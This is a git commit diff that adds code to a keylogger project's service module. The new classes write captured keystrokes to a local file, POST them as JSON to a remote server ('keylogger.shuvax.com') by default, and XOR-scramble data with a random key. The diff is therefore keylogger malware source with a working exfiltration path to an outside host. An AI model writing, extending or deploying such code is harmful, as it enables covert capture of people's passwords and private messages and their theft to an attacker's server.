2864c00262a770e2431cd7fb563182cd481ad0c0
shlomo <email@example.com>
2025-02-16 07:09:32 +0200

    update 'service' by shlomo

--- KeyLoggerAgent/service.py
+++ KeyLoggerAgent/service.py
@@ -32,3 +32,40 @@ class KeyLoggerService(IKeyLogger):
     def clear_logged_keys(self) -> dict[str:str]:
         self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
 
+
+
+class FileWriter(Write):
+    def __init__(self,path=None):
+        self.path = ToolBox.get_file_path()
+
+    def write(self, data:dict[str:str]) -> bool:
+        try:
+            with open(self.path,"a",encoding='utf-8') as file:
+                convert_data = json.dumps(data)
+                file.write(convert_data)
+                print(self.path)
+                return True
+        except IOError:
+            return False
+
+class NetworkWriter(Write):
+    def __init__(self,url=None):
+        self.url = url or "https://keylogger.shuvax.com"
+    def write(self,data:dict[str:str]) -> bool:
+        try:
+            response = requests.post(self.url, json=data)
+            return response.status_code == 200
+        except requests.exceptions.RequestException:
+            return False
+
+
+class Encryptor:
+    def __init__(self):
+        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+
+    def encrypt(self,data:str) -> str:
+        ciphertext = ""
+        length_key = len(self.key)
+        for index in range(len(data)):
+            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
+        return ciphertext
